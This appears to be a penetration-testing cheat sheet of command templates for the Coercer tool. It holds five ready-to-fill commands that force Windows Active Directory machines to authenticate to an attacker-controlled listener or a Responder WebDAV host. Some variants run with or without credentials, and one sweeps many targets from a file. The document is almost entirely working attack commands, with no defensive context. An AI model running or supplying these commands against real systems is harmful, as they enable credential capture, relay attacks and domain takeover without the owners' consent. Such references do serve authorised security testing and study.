# Coercer

% adcs, certificate, windows, Active directory, template

## Coercer - try each method no pause
#plateform/linux #target/remote #cat/ATTACK
```
coercer coerce -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> -t <targetIp> --always-continue
```

## Coercer - No user, try each method no pause
#plateform/linux #target/remote #cat/ATTACK
```
coercer coerce -d '<domain>' --listener <hackerIp> -t <targetIp> --always-continue
```

## Coercer - try each method to coerce
#plateform/linux #target/remote #cat/RECON
```
coercer coerce -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> -t <targetIp> 
```

## Coercer - Webdav
#plateform/linux #target/remote #cat/RECON
```
coercer coerce -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' -t <targetIp> 
```

## Coercer - List vulns many targets
#plateform/linux #target/remote #cat/RECON
```
coercer coerce -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile> 
```